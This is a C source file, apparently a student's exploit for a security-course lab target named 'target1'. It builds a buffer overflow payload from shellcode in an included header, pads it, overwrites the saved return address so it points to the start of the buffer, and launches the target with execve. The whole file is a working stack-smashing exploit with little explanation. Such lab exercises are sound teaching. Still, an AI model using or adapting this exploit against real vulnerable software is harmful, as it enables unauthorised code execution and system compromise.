#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"


//My own constants
#define BUFSIZE 125
#define TARGET_RA_ADDR 0x202dfe10//where want to return, for now start of buf
#define SHELL_LENGTH 45	//46th byte is a null in shell code

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	//printf("Sploit1.c: Before making attack_buffer:\n");
	
	//Making the attack buffer
	char attack_buffer[BUFSIZE];
	int *p;
	//printf("Size of pointer p(int*) is %d\n",sizeof(p));
	

	//Making the attack buffer

	//Fill all of buffer with a random number - 0x04
	int i;
	for(i = 0; i< BUFSIZE;i++)
	{
		attack_buffer[i] = 0x04;
	}

	//Fill first 45 bytes of buffer with shellcode
	for(i = 0; i< SHELL_LENGTH;i++)
	{
		attack_buffer[i] = shellcode[i];
	}

	//Attack_buffer[45] to attack_buffer[119] with random stuff for debugging - 0x05
	for(i = 45 ; i < 120; i++)
	{
		attack_buffer[i] = 0x05;
	}

	//Fill end with return address which is address of start of buf
	int *a = (int*)&attack_buffer[120];
	*a = TARGET_RA_ADDR;

	//Putting in null since execv will check for null when putting in argv array
	attack_buffer[BUFSIZE-1] = '\0';

	//printf("&attack_buffer[120] as hex: %u\n",&attack_buffer[120]);	//debugging

	args[0] = TARGET;
	args[1] = attack_buffer;	//was "hi there" before
	args[2] = NULL;

	env[0] = NULL;
	
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
